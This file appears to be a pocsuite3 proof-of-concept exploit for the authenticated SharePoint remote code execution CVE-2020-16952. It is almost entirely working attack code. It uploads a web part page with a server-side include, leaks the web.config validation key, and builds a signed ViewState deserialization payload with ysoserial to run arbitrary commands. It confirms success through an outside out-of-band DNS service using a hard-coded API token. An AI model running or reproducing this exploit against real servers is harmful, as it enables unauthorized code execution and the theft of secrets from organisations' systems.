#!/usr/bin/env python
# _*_ encoding：utf-8 _*_

from pocsuite3.api import POCBase
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import requests
from pocsuite3.lib.utils import random_str
from requests_ntlm import HttpNtlmAuth
import subprocess
import re


class SharePoint(POCBase):
    vulID = ''
    version = '1.0'
    author = ['big04dream']
    vulDate = '2020-10-14'
    createDate = '2020-11-11'
    updateDate = '2020-11-11'
    references = ['https://srcincite.io/advisories/src-2020-0022/']
    name = 'Microsoft SharePoint 授权RCE漏洞（CVE-2020-16952）'
    appPowerLink = 'https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16952'
    appName = 'Microsoft SharePoint'
    appVersion = 'Microsoft SharePoint Foundation 2013 Service Pack 1,\
     Microsoft SharePoint Enterprise Server 2016,\
     Microsoft SharePoint Server 2019'
    vulType = 'rce'
    desc = '''
    eg： must ysoserial.exe tools
    '''

    def _options(self):
        o = OrderedDict()
        o['domain'] = OptString('', description='eg: win-3t816hj84n4/sites/test harryh@pwn.me:user123### whoami', require=True)
        o['user'] = OptString('', description='eg: win-3t816hj84n4/sites/test harryh@pwn.me:user123### whoami', require=True)
        o['password'] = OptString('', description='eg: win-3t816hj84n4/sites/test harryh@pwn.me:user123### whoami', require=True)
        return o

    def put_page(self):
        payload = """<WebPartPages:DataFormWebPart runat="server">
    <ParameterBindings>
      <ParameterBinding Name="ssi" Location="ServerVariable(HTTP_360Vulcan)" DefaultValue="" />
    </ParameterBindings>
      <xsl>
        <xsl:stylesheet xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
          <xsl:param name="ssi" />
          <xsl:template match="/">
            <xsl:value-of select="$ssi" disable-output-escaping="yes" />
          </xsl:template>
        </xsl:stylesheet>
      </xsl>
    </WebPartPages:DataFormWebPart>"""
        domain = self.get_option('domain')
        user = self.get_option('user')
        password = self.get_option('password')
        r = requests.put("http://%s/poc.aspx" % self.url, data=payload,
                         auth=HttpNtlmAuth('%s\\%s' % (domain, user), password))
        assert (r.status_code == 200 or r.status_code == 201), "(-) page creation failed, user doesn't have site ownership rights!"

    def get_vkey(self):
        h = {"Vulcan": "<form runat=\"server\" /><!--#include virtual=\"/web.config\"-->"}
        domain = self.get_option('domain')
        user = self.get_option('user')
        password = self.get_option('password')
        r = requests.get("http://%s/poc.aspx" % self.url, auth=HttpNtlmAuth('%s\\%s' % (domain, user), password),
                         headers=h)
        match = re.search("machineKey validationKey=\"(.{64})", r.text)
        assert match, "(-) unable to leak the validation key, exploit failed!"
        return match.group(1)

    def trigger_rce(self, cmd):
        domain = self.get_option('domain')
        user = self.get_option('user')
        password = self.get_option('password')
        out = subprocess.Popen([
            'yss/ysoserial.exe',
            '-p', 'ViewState',
            '-g', 'TypeConfuseDelegate',
            '-c', '%s' % cmd,
                  '--apppath=%s' % self.url,
                  '--path=%s_layouts/15/zoombldr.aspx' % self.url,
            '--islegacy',
            '--validationalg=HMACSHA256',
                  '--validationkey=%s' % self.get_vkey()
        ], stdout=subprocess.PIPE)
        rce = {"__VIEWSTATE": out.communicate()[0].decode()}
        requests.post("http://%s/_layouts/15/zoombldr.aspx" % self.url, data=rce,
                      auth=HttpNtlmAuth('%s\\%s' % (domain, user), password))

    def _verify(self):
        result = {}
        try:
            cmd = random_str(16) + '.6eb4yw.ceye.io'
            cmd2 = 'ping ' + cmd
            self.trigger_rce(cmd)
            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if cmd in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = cmd2
        except Exception as e:
            pass
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(SharePoint)
